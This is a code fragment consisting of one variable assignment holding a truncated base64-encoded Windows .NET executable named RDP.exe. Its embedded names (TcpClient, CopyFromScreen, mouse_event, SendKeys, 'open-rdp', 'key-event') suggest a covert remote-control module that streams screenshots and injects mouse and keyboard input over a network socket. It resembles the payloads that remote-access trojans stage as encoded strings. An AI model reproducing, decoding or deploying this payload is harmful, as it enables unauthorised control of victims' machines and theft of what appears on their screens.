	encoded = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEEANarAV0AAAAAAAAAAOAAAgELAQsAADQAAAAWAAAAAAAA3lIAAAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAADAAAAABAAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAIRSAABXAAAAAIAAADgRAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAwAAAAAYAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA5DIAAAAgAAAANAAAAAQAAAAAAAAAAAAAAAAAACAAAGAuc2RhdGEAAIkAAAAAYAAAAAIAAAA4AAAAAAAAAAAAAAAAAABAAADALnJzcmMAAAA4EQAAAIAAAAASAAAAOgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAACgAAAAAgAAAEwhAAAGgiwAALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgIoAQAACgAAKgAAKgACKAUAAAoAACoA0nMHAAAKgAEAAARzCAAACoACAAAEcwkAAAqAAwAABHMKAAAKgAQAAARzCwAACoAFAAAEACoAAAATMAEAEAAAAAEAABEAfgEAAARvDAAACgorAAYqEzABABAAAAACAAARAH4CAAAEbw0AAAoKKwAGKhMwAQAQAAAAAwAAEQB+AwAABG8OAAAKCisABioTMAEAEAAAAAQAABEAfgQAAARvDwAACgorAAYqEzABABAAAAAFAAARAH4FAAAEbxAAAAoKKwAGKhswBAATAQAABgAAEQACjAEAABssEg8A/hYBAAAbbxQAAAotAxYrARcTBBEEOeYAAAB+BgAABBT+ARb+ARMFEQUsM34GAAAE0AEAABsoFQAACm8WAAAKEwYRBiwWcgEAAHAWjRsAAAEoFwAACnMYAAAKegArCwBzGQAACoAGAAAEAH4GAAAE0AEAABsoFQAAChRvGgAACgAAKAEAACsK3n3ecnUYAAABJS0EJhYrFiUMKBwAAAoIbx0AAAoU/gEW/gEW/gP+ESZyOwAAcBeNGwAAAQ0JFghvHQAACm8eAAAKogAJKBcAAAoLBwhvHQAACnMfAAAKeiggAAAK3hcAfgYAAATQAQAAGygVAAAKbyEAAAoA3AArBQACCisBAAYqAAEcAAABAIwACroAN5YAAAACAIwAZfEAFwAAAAETMAIAHwAAAAcAABEAA/4WAgAAG28iAAAKAAMSAP4VAgAAGwaBAgAAGwAqACoAAigjAAAKAAAqABMwAgASAAAACAAAEQACAygkAAAKKCUAAAoKKwAGKgAAEzABAAwAAAAJAAARAAIoJgAACgorAAYqEzABABAAAAAKAAARANAFAAACKBUAAAoKKwAGKhMwAQAMAAAACwAAEQACKCcAAAoKKwAGKhMwAgASAAAADAAAEQACAygkAAAKKCUAAAoKKwAGKgAAEzABAAwAAAANAAARAAIoJgAACgorAAYqEzABABAAAAAOAAARANAGAAACKBUAAAoKKwAGKhMwAQAMAAAADwAAEQACKCcAAAoKKwAGKhMwAgAgAAAAEAAAEQACjAMAABsU/gELBywKKAEAACsKKwgrBQACCisBAAYqEzACABIAAAARAAARAAMSAP4VBAAAGwaBBAAAGwAqAAAqAAIoIwAACgAAKgATMAIAJgAAABIAABEAfioAAAqMBQAAGxT+AQsHLAooAgAAK4AqAAAKfioAAAoKKwAGKgAAKgACKCMAAAoAACoAQgACKCMAAAoAKBsAAAYAACoAAAAbMAIANwAAABMAABEAACgtAAAKby4AAApvLwAAChz+BBb+AQsHLAcYKBoAAAYmAN4PJSgcAAAKCgAoIAAACt4AAAAqAAEQAAAAAAIAIyUADyAAAAETMAMASAAAABQAABEAKAQAAAZvMAAACm8xAAAKDBICKDIAAAooMwAACnJxAABwKAQAAAZvMAAACm8xAAAKCxIBKDQAAAooMwAACig1AAAKCisABioTMAcA5AAAABUAABEAKAQAAAZvMAAACm8xAAAKChIAKDIAAAoSACg0AAAKIAogJgBzNgAACgwIKDcAAAoTBBEEFhYWFhIAKDgAAAogIADMAG85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LAx3BGEAQwx9BOkBTQyDBOkBUwwTAOkBXgyLBGEAYwwTAPkBaQwXAOEBbgyTBNkAcQqbBNkAeAyhBNkAgQymBNkAiQyrBNkAmAyxBAkCOQG4BNkBOQG+BNkBvQxjAhkCzAzFBPkB1QwXANkB2QzvAGEB+wvzBCECOQETACkCOQHVAzEC/wz9BBkADA0NBTkAJQ0TBWkAOQEZBUECPw14BXkAOQETAEkCOQHxBVkCOQE0AWECOQETAGkCOQHSAXECOQHSAXkCOQHSAYECOQHSAYkCOQHSAZECOQHSAZkCOQHSAaECOQHSAQgAJADPAAgAKADUAAgALADZAAgAPAD0AAgAQADZAAgARAD5AAgASAD+AAgATAADAQoATQAlAQgAUAAIAQoAUQAlAQgAVAANAQoAVQAlAQgAWAASAQoAWQAlASAAIwDUACkAmwD5AS4AowN4Bi4AswNwAy4AuwN4Bi4AkwNwAy4AawP4BS4AqwODBi4AcwMBBi4AmwNgBi4AewMKBi4AgwMpBi4AWwFwAy4AiwM2BkAAMwDUAEAAEwBvAUMAEwBvAUMAGwB+AUkAmwAKAmAAIwDUAGMAGwB+AWMAEwBvAWkAmwAeAoAAMwDUAIMAkwDUAIMAiwDUAIMAGwB+AYkAmwDXAaAAMwDUAKMAQwGYAqMAEwBvAakAmwDlAcAAMwDUAMEASwHUAMMAEwBvAcMAQwH3AuAAMwDUAOEASwHUAOEAYwHUAOMAWwFwA+MAEwBvAekAEwBvBQABMwDUAAkBEwBvBSABMwDUAEABMwDUAEMBiwDUAEkBmwDgBWABEwBvAWABMwDUAIABEwBvAYMBGwAuBYMBYwHUAIMBiwDUAIMBIwDUAIMBkwDUAKABEwBvAaMBGwCGBaMBYwHUAKMBEwBvBcABEwBvAcMBYwHUAMMBkwDUAMMBiwDUAMMBIwDUAOABEwBvAQACMwDUAAACEwBvASACMwDUACACEwBvAUACMwDUAEACEwBvAWACMwDUAGACEwBvAYACMwDUAKACMwDUAMACEwBvAcACMwDUAOACMwDUAAADMwDUAAADEwBvASAEKwPUAGAEWwLUAGAEYwHUAIAEIwDUAAAGIwDUALkBvgHDAcgBzQFoAnUCfwKDAocCjAJ/AoMChwKMAvECdQJlA4IDoQP6AzcETwTKBOgE+AT4BAQFIQUpBYEFgQUEAAEABwAGAAwABwANAAkADgAKAAAAXQFcAAAAOAJhAAAAxQFmAAAARAJrAAAASgJwAAAAKgOqAAAAuQVRAQAAOAZWAQAAiQZkAQAAngZkAQIABAADAAIABQAFAAIABgAHAAIABwAJAAIACAALAAIAFwANAAIALAAPAAEALgARAAIALQARAAIAMQATAAIAMgAVAFwFrAt1AHUAdQB1AJ4AlgGdAaQBqwGyAVkDAAE1ADYDAgBDAUsALQUBAASAAAABAAEAAAAAAAAAAAAAAJQAAAACAAAAAAAAAAAAAAABAAoAAAAAAAgAAAAAAAAAAAAAAAoAEwAAAAAAAgAAAAAAAAAAAAAAAQBpAgAAAAACAAAAAAAAAAAAAAAKAIkDAAAAAAIAAAAAAAAAAAAAAAEAZgEAAAAAAAAAAAEAAAB8DgAABQAEAAYABAAHAAQACQAIAAAAEAAOAIMCAAAQABMAgwIAAAAAFQCDAgAAEAApAIMCAAAAACsAgwI3AEkCNwBgAwIAFQADABUAAAAAPE1vZHVsZT4AbXNjb3JsaWIATWljcm9zb2Z0LlZpc3VhbEJhc2ljAE15QXBwbGljYXRpb24AUkRQLk15AE15Q29tcHV0ZXIATXlQcm9qZWN0AE15Rm9ybXMATXlXZWJTZXJ2aWNlcwBUaHJlYWRTYWZlT2JqZWN0UHJvdmlkZXJgMQBHcmFwaGljc0hhbmRsZXIAUkRQAFByb2Nlc3NEUElBd2FyZW5lc3MATW9kdWxlMQBNb3VzZUV2ZW50AFJlc291cmNlcwBSRFAuTXkuUmVzb3VyY2VzAE15U2V0dGluZ3MATXlTZXR0aW5nc1Byb3BlcnR5AE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5BcHBsaWNhdGlvblNlcnZpY2VzAENvbnNvbGVBcHBsaWNhdGlvbkJhc2UALmN0b3IATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkRldmljZXMAQ29tcHV0ZXIAU3lzdGVtAE9iamVjdAAuY2N0b3IAZ2V0X0NvbXB1dGVyAG1fQ29tcHV0ZXJPYmplY3RQcm92aWRlcgBnZXRfQXBwbGljYXRpb24AbV9BcHBPYmplY3RQcm92aWRlcgBVc2VyAGdldF9Vc2VyAG1fVXNlck9iamVjdFByb3ZpZGVyAGdldF9Gb3JtcwBtX015Rm9ybXNPYmplY3RQcm92aWRlcgBnZXRfV2ViU2VydmljZXMAbV9NeVdlYlNlcnZpY2VzT2JqZWN0UHJvdmlkZXIAQXBwbGljYXRpb24ARm9ybXMAV2ViU2VydmljZXMAQ3JlYXRlX19JbnN0YW5jZV9fAFN5c3RlbS5XaW5kb3dzLkZvcm1zAEZvcm0AVABJbnN0YW5jZQBEaXNwb3NlX19JbnN0YW5jZV9fAGluc3RhbmNlAFN5c3RlbS5Db2xsZWN0aW9ucwBIYXNodGFibGUAbV9Gb3JtQmVpbmdDcmVhdGVkAEVxdWFscwBvAEdldEhhc2hDb2RlAFR5cGUAR2V0VHlwZQBUb1N0cmluZwBnZXRfR2V0SW5zdGFuY2UAbV9UaHJlYWRTdGF0aWNWYWx1ZQBHZXRJbnN0YW5jZQBTZXRQcm9jZXNzRHBpQXdhcmVuZXNzAHZhbHVlAFNldERwaUF3YXJlbmVzcwBHZXRTY3JlZW5SZXNvbHV0aW9uAFRha2VTaG9vdABxdWFsaXR5AFN5c3RlbS5EcmF3aW5nAEJpdG1hcABJbWFnZQBDb21wcmVzc0pQRUcAaW1nAHJhdGlvAFN5c3RlbS5EcmF3aW5nLkltYWdpbmcASW1hZ2VDb2RlY0luZm8AR2V0SnBlZ0NvZGVjSW5mbwBFbnVtAHZhbHVlX18AUHJvY2Vzc0RQSVVuYXdhcmUAUHJvY2Vzc1N5c3RlbURQSUF3YXJlAFByb2Nlc3NQZXJNb25pdG9yRFBJQXdhcmUAU3lzdGVtLk5ldC5Tb2NrZXRzAFRjcENsaWVudABzb2NrZXQAZ2gAbG9vcGluZwBtYWluAGFyZ3MAUG9zdEdyYXBoaWNzAE1PVVNFRVZFTlRGX0FCU09MVVRFAE1PVVNFRVZFTlRGX0xFRlRET1dOAE1PVVNFRVZFTlRGX0xFRlRVUABNT1VTRUVWRU5URl9SSUdIVERPV04ATU9VU0VFVkVOVEZfUklHSFRVUABNT1VTRUVWRU5URl9NSURETEVET1dOAE1PVVNFRVZFTlRGX01JRERMRVVQAE1PVVNFRVZFTlRGX1dIRUVMAG1vdXNlX2V2ZW50AGR3RmxhZ3MAZHgAZHkAY0J1dHRvbnMAZHdFeHRyYUluZm8AdXNlcjMyAENsaWNrAE5CdXR0b24ARGJsQ2xpY2sATW91c2VEb3duAE1vdXNlVXAATW92ZVRvAFgAWQBNb3VzZVdoZWVsAERlbHRhAFN5c3RlbS5SZXNvdXJjZXMAUmVzb3VyY2VNYW5hZ2VyAHJlc291cmNlTWFuAFN5c3RlbS5HbG9iYWxpemF0aW9uAEN1bHR1cmVJbmZvAHJlc291cmNlQ3VsdHVyZQBnZXRfUmVzb3VyY2VNYW5hZ2VyAGdldF9DdWx0dXJlAHNldF9DdWx0dXJlAFZhbHVlAEN1bHR1cmUAU3lzdGVtLkNvbmZpZ3VyYXRpb24AQXBwbGljYXRpb25TZXR0aW5nc0Jhc2UAZGVmYXVsdEluc3RhbmNlAGdldF9EZWZhdWx0AERlZmF1bHQAZ2V0X1NldHRpbmdzAFNldHRpbmdzAFN5c3RlbS5Db21wb25lbnRNb2RlbABFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUARWRpdG9yQnJvd3NhYmxlU3RhdGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQBTeXN0ZW0uRGlhZ25vc3RpY3MARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dlckhpZGRlbkF0dHJpYnV0ZQBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQ29tcGlsZXJTZXJ2aWNlcwBTdGFuZGFyZE1vZHVsZUF0dHJpYnV0ZQBIaWRlTW9kdWxlTmFtZUF0dHJpYnV0ZQBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduAEhlbHBLZXl3b3JkQXR0cmlidXRlAFN5c3RlbS5SZWZsZWN0aW9uAFRhcmdldEludm9jYXRpb25FeGNlcHRpb24AQ29udHJvbABnZXRfSXNEaXNwb3NlZABSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbmRsZQBDb250YWluc0tleQBTdHJpbmcAVXRpbHMAR2V0UmVzb3VyY2VTdHJpbmcASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBBZGQAQWN0aXZhdG9yAENyZWF0ZUluc3RhbmNlAFByb2plY3REYXRhAEV4Y2VwdGlvbgBTZXRQcm9qZWN0RXJyb3IAZ2V0X0lubmVyRXhjZXB0aW9uAGdldF9NZXNzYWdlAENsZWFyUHJvamVjdEVycm9yAFJlbW92ZQBDb21wb25lbnQARGlzcG9zZQBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAE15R3JvdXBDb2xsZWN0aW9uQXR0cmlidXRlAFRocmVhZFN0YXRpY0F0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBFbnZpcm9ubWVudABPcGVyYXRpbmdTeXN0ZW0AZ2V0X09TVmVyc2lvbgBWZXJzaW9uAGdldF9WZXJzaW9uAGdldF9NYWpvcgBSZWN0YW5nbGUAU2NyZWVuAGdldF9TY3JlZW4AZ2V0X0JvdW5kcwBnZXRfV2lkdGgAQ29udmVyc2lvbnMAZ2V0X0hlaWdodABDb25jYXQAR3JhcGhpY3MAU3lzdGVtLklPAE1lbW9yeVN0cmVhbQBQaXhlbEZvcm1hdABGcm9tSW1hZ2UAU2l6ZQBnZXRfU2l6ZQBDb3B5UGl4ZWxPcGVyYXRpb24AQ29weUZyb21TY3JlZW4ATWF0aABSb3VuZABEcmF3SW1hZ2UASW1hZ2VGb3JtYXQAZ2V0X1BuZwBTdHJlYW0AU2F2ZQBUb0FycmF5AEVuY29kZXJQYXJhbWV0ZXJzAEVuY29kZXJQYXJhbWV0ZXIAZ2V0X1BhcmFtAEVuY29kZXIAUXVhbGl0eQBGcm9tU3RyZWFtAEdldEltYWdlRW5jb2RlcnMAZ2V0X01pbWVUeXBlAE9wZXJhdG9ycwBDb21wYXJlU3RyaW5nAERsbEltcG9ydEF0dHJpYnV0ZQBzaGNvcmUuZGxsAF9MYW1iZGEkX18xAGEwAERlYnVnZ2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAU3lzdGVtLlRocmVhZGluZwBUaHJlYWQAVG9JbnRlZ2VyAENvbm5lY3QAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X0FTQ0lJAEdldEJ5dGVzAE5ldHdvcmtTdHJlYW0AR2V0U3RyZWFtAFdyaXRlAEZsdXNoAEJ5dGUAUmVhZABDbG9zZQBFeGl0AEdldFN0cmluZwBFbmRzV2l0aABJbmRleE9mAFN1YnN0cmluZwBDaGFyAFNwbGl0AFBhcmFtZXRlcml6ZWRUaHJlYWRTdGFydABJbnQzMgBTdGFydABTZW5kS2V5cwBTZW5kV2FpdABSdW4AU2xlZXAAU1RBVGhyZWFkQXR0cmlidXRlAFBvaW50AEN1cnNvcgBzZXRfUG9zaXRpb24AUmVmZXJlbmNlRXF1YWxzAEFzc2VtYmx5AGdldF9Bc3NlbWJseQBTZXR0aW5nc0Jhc2UAU3luY2hyb25pemVkAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAUkRQLmV4ZQBSRFAuUmVzb3VyY2VzLnJlc291cmNlcwAAOVcAaQBuAEYAbwByAG0AcwBfAFIAZQBjAHUAcgBzAGkAdgBlAEYAbwByAG0AQwByAGUAYQB0AGUAADVXAGkAbgBGAG8AcgBtAHMAXwBTAGUAZQBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AAAN4AAAVaQBtAGEAZwBlAC8AagBwAGUAZwAAHUcARQBUACAALwBvAHAAZQBuAC0AcgBkAHAAfAABLyAASABUAFQAUAAvADEALgAxAA0ACgB1AHMAZQByAC0AYQBnAGUAbgB0ADoAIAABCQ0ACgANAAoAAAEABQ0ACgAAC3MAdABhAHIAdAAAF20AbwB1AHMAZQAtAGUAdgBlAG4AdAABC2MAbABpAGMAawAAGWQAbwB1AGIAbABlAC0AYwBsAGkAYwBrAAENYwB1AHIAcwBvAHIAAAt3AGgAZQBlAGwAABNrAGUAeQAtAGUAdgBlAG4AdAABA3wAABtSAEQAUAAuAFIAZQBzAG8AdQByAGMAZQBzAAAA4o4ZA0ni6Ue2wWr1eQOymgAIt3pcVhk04IkIsD9ffxHVCjoDIAABAwAAAQQAABIMBwYVEhwBEgwEAAASCAcGFRIcARIIBAAAEhEHBhUSHAESEQQAABIUBwYVEhwBEhQEAAASGAcGFRIcARIYBAgAEgwECAASCAQIABIRBAgAEhQECAASGAIeAAcQAQEeAB4ABzABAQEQHgADBhIZBCABAhwDIAAIBCAAEh0DIAAOAhMABCAAEwADBhMABCgAEwAFAAEIES